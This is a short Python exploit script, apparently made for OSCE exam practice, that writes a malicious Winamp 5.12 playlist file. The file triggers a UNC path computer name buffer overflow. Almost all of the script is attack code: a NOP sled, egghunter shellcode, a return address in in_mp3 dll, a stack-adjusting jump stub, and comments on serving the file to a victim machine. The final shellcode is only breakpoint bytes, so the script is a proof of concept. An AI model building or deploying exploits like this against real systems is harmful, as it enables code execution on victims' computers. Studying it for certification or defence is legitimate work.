#!/usr/bin/python
# Winamp 5.12 Playlist UNC Path Computer Name Overflow Python Exploit
#coded in python due to loathing of perl but necessity of use of this exploit for osce
start = "[playlist]\r\nFile1=\\\\"
nop = "\x90" * 856
#nops
#// 32 byte egghunt shellcode (egg=0x57303054)
#egghunter shellcode is

egghunter = "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x54\x30\x30\x57\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"

#"\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x54\x30\x30\x57\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"
shellcode = "\xcc" * 134
#breakpoints
#0202D961 -address of first call esp function in in_mp3 dll in the program
#this is added in to redirect execution

#0011FBD8   83EC 58          SUB ESP,58
#0011FBDB   83EC 58          SUB ESP,58
#0011FBDE   FFE4             JMP ESP
#first stage shellcode

jmp = "\x61\xd9\x02\x02" + "\x83\xec\x58\x83\xec\x58\xff\xe4" + "\x90\x90\x90\x90"
#41's for overwriting eip
end = "\r\nTitle1=pwnd\r\nLength1=512\r\nNumberOfEntries=1\r\nVersion=2\r\n"


payload = start + nop + egghunter + shellcode + jmp + end
poc = open('poc.pls', 'w')
poc.write(payload)
poc.close()
#you copy this generated poc.pls file into the apache web root, then download it onto the vista box
